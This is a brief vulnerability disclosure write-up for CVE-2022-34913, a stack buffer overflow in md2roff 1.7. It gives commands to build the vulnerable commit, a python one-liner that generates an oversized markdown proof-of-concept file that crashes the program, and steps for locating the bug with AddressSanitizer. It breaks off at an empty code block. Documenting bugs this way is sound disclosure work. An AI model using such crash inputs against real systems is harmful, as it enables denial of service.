# Description of CVE-2022-34913

md2roff 1.7 suffers from a stack-based buffer overflow via a Markdown file containing a large number of consecutive characters to be processed.

# Replication

To replicate the vulnerability, we must download a vulnerable version of md2roff (version 1.7):

```
git clone https://github.com/nereusx/md2roff.git
cd md2roff
git checkout 7fc373d25c91422454f081c8a717222d77fd7add
make
```

Once the project is compiled, we can start by creating a malicious markdown file with a large buffer of ascii characters:

```
python3 -c 'print("1"*5000)' > poc.md
```

Now we can point md2roff to our malicious markdown file and invoke a crash:

```
./md2roff poc.md
```

Executing the previous command will produce a segfault:

```
segmentation fault  ./md2roff poc.md
```

To gain a better understanding of where the overflow is taking place, lets recompile the project with address sanitizer (ASAN) by adding *-fsanitize=address* to the CFLAGS variable in the Makefile.  We also want the compiler to store symbol table information in the executable (-g flag) to help us determine which line of code produced the crash:

```
CFLAGS = -std=c99 -fsanitize=address -g
```

Next we will clean any stale files and recompile the project:

```
make clean
make
```

The output from ASAN shows us that the vulnerable source code can be found in *md2roff.c, line 1095*:
```
